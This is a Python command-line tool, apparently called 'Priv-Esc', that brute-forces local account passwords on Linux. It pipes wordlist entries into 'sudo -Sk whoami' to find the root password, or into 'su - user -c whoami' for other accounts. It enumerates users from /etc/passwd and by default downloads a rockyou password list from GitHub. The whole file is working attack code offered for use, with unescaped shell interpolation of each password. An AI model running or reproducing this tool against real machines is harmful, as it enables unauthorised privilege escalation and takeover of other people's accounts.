import subprocess
import os
import threading
import requests

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

password_found = False

benner = (f"""{RED}
     ____       _            _____
    |  _ \ _ __(_)_   __    | ____|___  ___
    | |_) | '__| \ \ / /____|  _| / __|/ __|
    |  __/| |  | |\ V /_____| |___\__ \ (__    {MAGENTA}by: TAHA{RESET}{RED}
    |_|   |_|  |_| \_/      |_____|___/\___|

        {RESET}""")


def send_password_root(password):
    global password_found
    try:
        command = f"echo '{password}' | sudo -Sk whoami"
        result = subprocess.run(command, shell=True,
                                capture_output=True, text=True)
        if "root" in result.stdout:
            password_found = True
            print(
                f"\n{GREEN}Password: {RESET}{MAGENTA}{password}{RESET}\n")
    except Exception as e:
        print(e)
        pass
    exit()


def root():
    done = 0
    lineoffile = 0
    erorr = 0
    try:
        os.system("clear")

        print(benner)
        chose = input(f"""{YELLOW}
[1] Custom List
[2] Default List{RESET}

{RED}[0] Return{RESET}

{CYAN}[*] Choose Option: {RESET}""")
        if chose == "1":
            threads = []
            file = input(f"{YELLOW}[*] Enter File: {RESET}")
            with open(file, "r") as f:
                passwords = [line.strip() for line in f]
                for _ in passwords:
                    lineoffile += 1
            print(f"{RED}[*] Searching . . .{RESET}")
            for password in passwords:
                if password_found:
                    break
                try:
                    t = threading.Thread(
                        target=send_password_root, args=(password,))
                    t.start()
                    threads.append(t)
                except Exception as e:
                    print(e)
                    erorr += 1
                done += 1
                print(
                    f"{RED}Erorr: {erorr}{RESET} , {BLUE}Checked: {done}:{lineoffile}{RESET}", end='\r')
            for t in threads:
                t.join()
        elif chose == "0":
            main()
        elif chose == "2":
            file = "https://raw.githubusercontent.com/berandal666/Passwords/master/rockyou-75.txt"
            get = requests.get(file)
            passwords = get.text.strip().split("\n")
            threads = []
            for _ in passwords:
                lineoffile += 1
            for password in passwords:
                if password_found:
                    break
                try:
                    t = threading.Thread(
                        target=send_password_root, args=(password,))
                    t.start()
                    threads.append(t)
                except:
                    erorr += 1
                done += 1
                print(
                    f"{RED}Erorr: {erorr}{RESET} , {BLUE}Checked: {done}:{lineoffile}{RESET}", end='\r')
            for t in threads:
                t.join()
    except Exception as e:
        print(e)
        input(f"{YELLOW}[-] Enter To Return: ")
        main()
    except KeyboardInterrupt:
        try:
            print(f"{RED}\n\n[-] Exit ..")
            exit()
        except:
            pass


def send_password_user(password, user):
    global password_found
    try:
        command = f"echo '{password}' | su - {user} -c whoami"
        result = subprocess.run(command, shell=True,
                                capture_output=True, text=True)
        if user in result.stdout:
            password_found = True
            print(
                f"\n{GREEN}Password: {RESET}{MAGENTA}{password}{RESET}\n")
    except Exception as e:
        print(e)
        pass
    exit()


def userpass():
    done = 0
    lineoffile = 0
    erorr = 0
    try:
        os.system("clear")

        print(benner)
        user = input(f"{RED}[+] Enter Username: {RESET}")
        if user == "":
            input(f"{RED}\n[-] ERORR! : ")
            userpass()
        output = os.popen('cut -d: -f1 /etc/passwd | sort').read()
        users = output.split('\n')
        u = set()
        for usera in users:
            u.add(usera)
        if user not in u:
            input(f"{RED}[-] No User {user} !: {RESET}")
            userpass()
        chose = input(f"""{YELLOW}
[1] Custom List
[2] Default List{RESET}

{RED}[0] Return{RESET}

{CYAN}[*] Choose Option: {RESET}""")
        if chose == "1":
            threads = []
            file = input(f"{YELLOW}[*] Enter File: {RESET}")
            with open(file, "r") as f:
                passwords = [line.strip() for line in f]
                for _ in passwords:
                    lineoffile += 1
            print(f"{RED}[*] Searching . . .{RESET}")
            for password in passwords:
                if password_found:
                    break
                try:
                    t = threading.Thread(
                        target=send_password_user, args=(password, user,))
                    t.start()
                    threads.append(t)
                except Exception as e:
                    print(e)
                    erorr += 1
                done += 1
                print(
                    f"{RED}Erorr: {erorr}{RESET} , {BLUE}Checked: {done}:{lineoffile}{RESET}", end='\r')
            for t in threads:
                t.join()
        elif chose == "0":
            main()
        elif chose == "2":
            file = "https://raw.githubusercontent.com/berandal666/Passwords/master/rockyou-75.txt"
            get = requests.get(file)
            passwords = get.text.strip().split("\n")
            threads = []
            for _ in passwords:
                lineoffile += 1
            for password in passwords:
                if password_found:
                    break
                try:
                    t = threading.Thread(
                        target=send_password_user, args=(password, user,))
                    t.start()
                    threads.append(t)
                except:
                    erorr += 1
                done += 1
                print(
                    f"{RED}Erorr: {erorr}{RESET} , {BLUE}Checked: {done}:{lineoffile}{RESET}", end='\r')
            for t in threads:
                t.join()
        else:
            input(f"{RED}[-] Choosse option!: {RecursionError}")
            userpass()
    except Exception as e:
        print(e)
        input(f"{YELLOW}[-] Enter To Return: {RESET}")
        main()
    except KeyboardInterrupt:
        try:
            print(f"{RED}\n\n[-] Exit ..")
            exit()
        except:
            pass


def main():
    os.system("clear")

    print(benner)
    chose = input(f"""{CYAN}
[1] Brute Force For ROOT
[2] Brute Force For Other User In System

[+] Choose Number: {RESET}""")
    if chose == "1":
        root()
    elif chose == "2":
        userpass()
    else:
        input(f"[-] Erorr .. | Enter To Return: ")
        main()


if __name__ == "__main__":
    main()
